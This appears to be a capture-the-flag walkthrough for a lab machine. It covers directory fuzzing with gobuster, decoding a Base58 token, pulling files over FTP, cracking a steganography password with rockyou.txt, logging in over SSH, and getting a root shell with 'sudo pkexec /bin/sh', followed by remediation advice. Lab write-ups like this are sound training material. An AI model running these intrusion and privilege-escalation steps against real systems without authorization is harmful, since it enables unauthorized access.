
**Scope / Objective**  
Document the steps taken to discover files, retrieve credentials, and escalate privileges on the target host (IP redacted in places). This is written as a reproducible playbook: commands executed, why they were run, outputs of interest, and remediation suggestions.

---

## Environment / prerequisites

- Attacking machine with standard recon and pentest utilities installed (examples used below): `gobuster`, `curl`, `ftp`, `ssh`, `unzip`, `stegcracker`.
    
- Wordlists located at `/usr/share/seclists/` (common on Kali / Parrot / similar).
    
- Target: `http://0.0.0.0/` (replace with real target IP when reproducing). In examples some commands target `http://10.201.111.228/island/2100/` — use whichever target IP/URL you have.
    

---

## Quick TL;DR

1. Used `gobuster` directory fuzzing to enumerate web directories and files.
    
2. Found the string `vigilante` in source code and discovered files with `.ticket` extension under a numeric path.
    
3. Extracted an encoded token (`RTy8yhBQdscX`) and decoded from Base58 (CyberChef used interactively).
    
4. Discovered credentials, connected to FTP, downloaded files including `aa.jpg` and `ss.zip`.
    
5. Used `stegcracker` + `rockyou.txt` to brute-force a password hidden in `aa.jpg`.
    
6. Extracted the zip (password `password`), retrieved further data including a password for user `slade`.
    
7. SSH to `slade@<target>` and captured `user.txt`.
    
8. Used `pkexec` misconfiguration to get a root shell and captured `root.txt`.
    

---

## Full reproducible steps

### 1) Directory discovery with Gobuster

Scan the root webserver for directories and file names using a medium-sized directory wordlist:

```bash
gobuster dir -u http://0.0.0.0/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
```

Notes: replace `0.0.0.0` with the target IP or hostname. `gobuster dir` will reveal accessible directories and file names.

### 2) Additional discovery (code / fuzzing)

Using shorter wordlists for specific discovery (example found the token `vigilante`):

```bash
gobuster dir -u http://0.0.0.0/ -w /usr/share/seclists/Fuzzing/4-digits-0000-9999.txt
```

If you find hints in source code or pages (like a keyword `vigilante`), follow links or try deeper paths based on those hints.

### 3) Finding `.ticket` files and numeric directories

A discovered path used a 4-digit directory (example): `/island/2100/`. Look for extensions and try `-x` to brute-force extensions with Gobuster:

```bash
gobuster dir -u http://10.201.111.228/island/2100/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x ticket
```

This returned a file (or content) containing the string:

```
RTy8yhBQdscX
```

### 4) Decode token (Base58)

The token above appears Base58-encoded. You can decode it with CyberChef, or using a command-line tool / script. Example (CyberChef):

- Recipe: `From Base` → `Base58`.
    

If you'd like a CLI alternative, use a small Python snippet (on your machine):

```python
# python3 -c 'import base58,sys; print(base58.b58decode("RTy8yhBQdscX").decode())'
```

(Install `base58` via pip if needed: `pip install base58`.)

### 5) Connect to FTP and list files

Use the discovered credentials (or anonymous if available) to connect to FTP and fetch files:

```bash
ftp 0.0.0.0
# then use `ls`, `cd` and `get` to download files
# example:
get aa.jpg
get ss.zip
```

### 6) Steganography — brute forcing hidden password in `aa.jpg`

Use `stegcracker` with a wordlist (commonly `rockyou.txt`) to find passwords embedded in the image:

```bash
stegcracker aa.jpg /usr/share/wordlists/rockyou.txt
```

This produced the password: `password`.

### 7) Unzip `ss.zip` with discovered password

```bash
unzip ss.zip
# enter password: password
```

Inspect the extracted files for credentials or other useful artifacts.

### 8) Determine username and obtain SSH access

From files found in the zip (or other artifacts), a username was discovered (`slade`). Connect with SSH:

```bash
ssh slade@0.0.0.0
# use discovered password
```

Once in, capture the user flag (`user.txt`) and enumerate the host for privilege escalation possibilities.

### 9) Privilege escalation via `pkexec`

A vulnerable/misconfigured `pkexec` allowed spawning a root shell:

```bash
sudo /usr/bin/pkexec /bin/sh
# or: pkexec /bin/sh
```

If `pkexec` runs without proper authorization checks, you may obtain a root shell. Capture `root.txt`.

---

## Artifacts & key values (from this run)

- Encoded token: `RTy8yhBQdscX` (Base58 -> decoded value used as a credential)
    
- Steg password (for `aa.jpg`): `password`
    
- Username discovered: `slade`
    
- Flags obtained: `user.txt`, `root.txt`
    

> **Note:** Replace `0.0.0.0` with the actual target IP in reproduction.

---

## Suggestions for remediation (owner / dev notes)

1. **Remove sensitive tokens from public web content / source** — tokens such as the Base58 string should not be left in source code or accessible files.
    
2. **Harden FTP** — do not allow anonymous downloads of archives containing credentials. Use secure file transfer (SFTP) and remove credentials from stored files.
    
3. **Avoid storing secrets in images / archives** — or protect them with proper access controls.
    
4. **Fix PKEXEC misconfiguration** — ensure `pkexec` and polkit rules are up-to-date and properly restrict which commands non-root users can execute; patch known CVEs and follow least privilege.
    
5. **Rotate credentials** discovered during the test and enforce strong password policies.
    

---

## Reproduction checklist (for testers)

-  Target IP/URL set in all commands.
    
-  Wordlists available at `/usr/share/seclists/`.
    
-  Tools installed: `gobuster`, `stegcracker`, `ftp`, `ssh`, `unzip`, Python + `base58` (optional).
    

---

## Appendix: Useful one-liners

- Decode Base58 (Python):
    

```bash
python3 -c 'import base58;print(base58.b58decode("RTy8yhBQdscX"))'
```

- Download files over FTP non-interactively (example):
    

```bash
curl -O ftp://username:password@0.0.0.0/path/to/file
```

---
